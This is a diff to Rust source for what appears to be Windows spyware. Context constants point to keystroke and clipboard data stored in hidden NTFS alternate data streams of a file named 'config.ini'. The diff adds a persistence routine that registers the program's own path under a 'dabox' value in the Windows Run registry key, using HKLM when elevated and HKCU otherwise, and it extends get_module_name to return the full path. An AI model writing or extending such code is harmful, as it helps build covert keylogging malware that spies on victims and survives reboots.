@@ -7,13 +7,29 @@ use winapi::um::fileapi::{SetFileAttributesW};
 use widestring::*;
 use winapi::um::libloaderapi::{GetModuleHandleW, GetModuleFileNameW};
 use winapi::shared::minwindef::{HMODULE};
+use std::ffi::{OsStr};
+use std::os::windows::prelude::OsStrExt;
 use std::ptr;
+use winapi::um::winreg::{
+  RegOpenKeyExW, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, LSTATUS,
+  RegCloseKey, RegSetValueExW
+};
+use winapi::shared::winerror::{ERROR_SUCCESS};
+use winapi::um::winnt::{KEY_READ, KEY_SET_VALUE, REG_SZ};
+use winapi::shared::minwindef::{HKEY, PHKEY, DWORD, PBYTE};
+use is_elevated::is_elevated;
 
 pub static RELEASE_BUFFER: u32 = 60000;
 pub static KEY_FILENAME: &str = "config.ini:kdata.dat";
 pub static CLIP_FILENAME: &str = "config.ini:cpdata.dat";
 pub const BASE_FILENAME: &str = "config.ini";
-pub static VERSION: &str = "0.1.0";
+pub static VERSION: &str = "0.0.2";
+
+#[derive(Debug, PartialEq)]
+pub enum Module {
+  Name,
+  Path,
+}
 
 #[derive(Debug, Copy, Clone)]
 #[allow(dead_code)]
@@ -460,13 +476,13 @@ pub fn set_file_hidden(hidden: bool) -> () {
 
 /**Function gets the name fo the running process.
  * Params:
- *  None.
+ *  ret: Mdoule {The return value will either be the module path or the module name}
  * Returns String.
  */
 #[allow(unused_assignments)]
-pub fn get_module_name() -> String {
-  let mut hmod: HMODULE = ptr::null_mut();        // Creates a mutable windows handle.
-  let mut buffer: [u16; 260] = [0; 260];          // The static buffer to hold the module path.
+pub fn get_module_name(ret: Module) -> String {
+  let mut hmod: HMODULE = ptr::null_mut();                // Creates a mutable windows handle.
+  let mut buffer: [u16; 260] = [0; 260];                  // The static buffer to hold the module path.
 
   unsafe {
     hmod = GetModuleHandleW(ptr::null());
@@ -484,10 +500,99 @@ pub fn get_module_name() -> String {
     }
   }
 
+  let mut output = "".to_owned();               // The return value.
+  let mut mod_slice = "";                         // A slice of the last element in the array.
+  let mut slice_array: Vec<&str> = Default::default();
+
   // Grab the name of the running process.
-  let slice_array: Vec<&str> = buffer_string.split("\\").collect();
-  let mod_slice = slice_array[slice_array.len()-1];
-  let output = mod_slice.replace("\0", "");
+  if ret == Module::Name {
+    slice_array = buffer_string.split("\\").collect();
+    mod_slice = slice_array[slice_array.len()-1];
+    output = mod_slice.replace("\0", "");
+  }
+  
+  else { output = buffer_string.replace("\0", ""); }
+  
 
   output
+}
+
+/**Function converts a utf8 buffer to u16 buffer.
+ * Params:
+ *  s: P {A pointer to the input buffer}
+ * Returns Vec<u16>
+ */
+fn to_utf16<P: AsRef<OsStr>>(s: P) -> Vec<u16> {
+  s.as_ref()
+      .encode_wide()
+      .chain(Some(0).into_iter())
+      .collect()
+}
+
+/**Function creates a registrt to start on boot
+ * Params:
+ *  dbg: bool - {Setting this option to try will display debug messages}
+ * Returns nothing.
+ */
+#[allow(unused_assignments)]
+pub fn setup_persistence(dbg: bool) -> () {
+  let mut handle: HKEY = ptr::null_mut();                                   // The root registry key to be opened.
+  let mut h_result: HKEY = ptr::null_mut();                                 // The registry key path to open.
+  let elevated: bool = is_elevated();                                       // Checks if the process is elevated.
+  const KEY: &str = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";    // A key to be executed on boot.
+
+  if elevated == true { handle = HKEY_LOCAL_MACHINE; }
+  else                { handle = HKEY_CURRENT_USER;  }
+
+  let utf16_buffer = to_utf16(KEY);
+  let mut status: LSTATUS = 0;
+
+  unsafe {                                                                  // Opens the registry key.
+    status = RegOpenKeyExW(
+      handle, 
+      utf16_buffer.as_ptr(), 
+      0 as u32, 
+      KEY_READ | KEY_SET_VALUE, 
+      (&mut h_result as *mut HKEY) as PHKEY,
+    );
+  }
+
+  if status == ERROR_SUCCESS as i32 {
+    if dbg == true {
+      if elevated == true {
+        println!(
+          "status:[{}]\n\nRegistry key at [{}] was successfully opened.\nProcess is admin...",
+          status, KEY
+        );
+      }
+      else {
+        println!(
+          "status:[{}]\n\nRegistry key at [{}] was successfully opened.\nProcess is not admin...",
+          status, KEY
+        );
+      }
+    }
+  }
+
+  let module_path = get_module_name(Module::Path);            // The path to the current process.
+  let module_len: u32 = module_path.clone().len() as u32;                 // The module path in bytes.
+  let run_key: Vec<u16> = to_utf16("dabox");                              // The value name.
+  let path: Vec<u16> = to_utf16(module_path);                             // The value data.
+
+  unsafe {
+    status = RegSetValueExW(                                              // Creates the value.
+      h_result,
+      run_key.as_ptr(),
+      0 as u32,
+      REG_SZ,
+      path.as_ptr() as PBYTE,
+      module_len*2+2 as DWORD
+    );
+  }
+
+  if status == ERROR_SUCCESS as i32 {
+    println!("Registry key was sucessfully created");
+  }
+
+  unsafe { RegCloseKey(h_result); }
 }
